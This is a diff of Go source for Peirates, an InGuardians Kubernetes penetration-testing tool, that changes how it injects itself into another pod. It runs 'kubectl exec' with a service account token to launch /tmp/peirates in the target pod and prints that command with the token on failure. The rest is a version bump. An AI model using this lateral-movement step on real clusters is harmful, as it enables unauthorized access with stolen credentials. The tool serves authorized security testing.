@@ -273,22 +273,24 @@ func injectIntoAPodViaAPIServer(connectionString ServerInfo, pod string) {
 		// runKubectlSimple (exec -it pod /tmp/peirates)
 
 		// println("Option 2 is: ")
-		println("Now, start up a new process, put a copy of kubectl in it, and move into that pod by running the following command:\n\n")
-		println("kubectl --token " + connectionString.Token + " --certificate-authority=" + connectionString.CAPath + " -n " + connectionString.Namespace + " exec -it " + pod + " -- /tmp/peirates\n")
 		// CA path
 		ca_path := "--certificate-authority=" + connectionString.CAPath
 		args := []string{"kubectl", "--token", connectionString.Token, ca_path, "-n", connectionString.Namespace, "exec", "-it", pod, "--", "/tmp/peirates"}
-		path := "/tmp/kubectl"
-		env := os.Environ()
-		execErr := syscall.Exec(path, args, env)
-		if execErr != nil {
-			panic(execErr)
+
+		path, lookErr := exec.LookPath("kubectl")
+		if lookErr != nil {
+			println("kubectl not found in the PATH in this pod. You can correct this and try again. Alternatively:\n")
+			println("Start up a new process, put a copy of kubectl in it, and move into that pod by running the following command:\n\n")
+			println("kubectl --token " + connectionString.Token + " --certificate-authority=" + connectionString.CAPath + " -n " + connectionString.Namespace + " exec -it " + pod + " -- /tmp/peirates\n")
+		} else {
+			env := os.Environ()
+			execErr := syscall.Exec(path, args, env)
+			if execErr != nil {
+				println("[-] Exec failed - try manually, as below.\n")
+				println("Start up a new process, put a copy of kubectl in it, and move into that pod by running the following command:\n\n")
+				println("kubectl --token " + connectionString.Token + " --certificate-authority=" + connectionString.CAPath + " -n " + connectionString.Namespace + " exec -it " + pod + " -- /tmp/peirates\n")
+			}
 		}
-		// TODO: replace the above one line with:
-		// binary, lookErr := exec.LookPath("ls")
-		// if lookErr != nil {
-		//	panic(lookErr)
-		//}
 	}
 }
 
@@ -782,7 +784,7 @@ func banner(connectionString ServerInfo) {
 ,,,,,,,,,,,,:.............,,,,,,,,,,,,,,
 ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
 ________________________________________
-	Peirates v1.0.23 by InGuardians
+	Peirates v1.0.24 by InGuardians
   https://www.inguardians.com/peirates
 ----------------------------------------------------------------`)
 
